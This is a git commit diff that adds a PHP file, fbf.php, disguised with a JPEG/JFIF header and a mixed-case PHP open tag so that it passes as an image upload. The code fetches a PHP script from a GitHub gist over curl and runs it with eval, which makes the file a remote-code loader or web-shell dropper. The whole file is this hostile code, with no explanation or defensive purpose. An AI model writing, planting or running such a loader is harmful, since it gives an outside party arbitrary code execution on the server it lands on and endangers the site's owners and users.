1d9038cd01b7803ddd54bf468a49e4a0734bd0e7
paknago21 <113289817+paknago21@users.noreply.github.com>
2023-08-16 02:23:33 -0700

    Add files via upload

---
+++ fbf.php
@@ -0,0 +1,15 @@
+ÿØÿà JFIF ÿþ;<?pHp
+   function get($url) {
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+      eval('?>' . get('https://gist.githubusercontent.com/paknago21/239bbd7ed977c62cb48f96267a579136/raw/1a177cf4305eace8a165ac2bb6e6088fbec6b613/lolll.php'));
+?>
